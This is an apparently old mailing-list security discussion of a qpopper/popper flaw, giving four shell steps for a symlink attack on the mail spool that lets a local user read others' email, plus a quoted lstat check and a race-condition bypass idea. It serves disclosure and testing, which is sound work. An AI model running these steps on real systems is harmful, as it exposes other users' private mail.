Some versions of popper and qpopper from qualcomm allow you to read
other peoples email.  There are quite a few situations in which you
need your mail spool directory chmodded 1777.  If you have local users
on a machine with the mail spool directory, they can create symbolic
links from the temporary pop drop box to a file that they can read.

See if youre vulnerable:

        1) touch /tmp/lumpy; chmod 777 /tmp/lumpy
        2) ln -s /tmp/lumpy /var/mail/.luser.pop
        3) wait for them to check their email.
        4) while they are reading it from the pop
           server, look at the file in the tmp dir.

Apparently it is fixed in the newest version.

Here's what I did when I tried this on my personal system at home which
runs QPOPPER 2.2:

/tmp$ telnet localhost 110
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
+OK QPOP (version 2.2) at (zang!) starting.  <2104.871076037@(plink!)>
user (poof!)
+OK Password required for (zap!).
pass (boink!)
- -ERR Your temporary drop file /usr/spool/mail/.(blink!).pop is not type 'regular file'

Even version 2.2 of qpopper is smart enough to know the difference between
a regular file and a symbolic link.


----------------------------------------------------------------------


Looks like there is a race condition in there.  It opens the file, does
some fstat()s on it to check a few things, then does:

#if defined(S_ISREG)
    /* Make sure the file is not a symbolic link reference */
    lstat(p->temp_drop, &mybuf);
    if (!S_ISREG(mybuf.st_mode)) {
        close(dfd);
        return pop_msg(p, POP_FAILURE,
        "Your temporary drop file %s is not type 'regular file'", p->temp_drop);
    }
#endif

All you need is a (rm .user.pop; touch .user.pop) after the open but
before the lstat to get around that check.

This code is from v2.4b2.  I'm not sure how this helps you do anything
though, since you are running setuid() to the user at that point; if a
user can read other user's mailboxes normally, I wouldn't be blaming
qpopper.
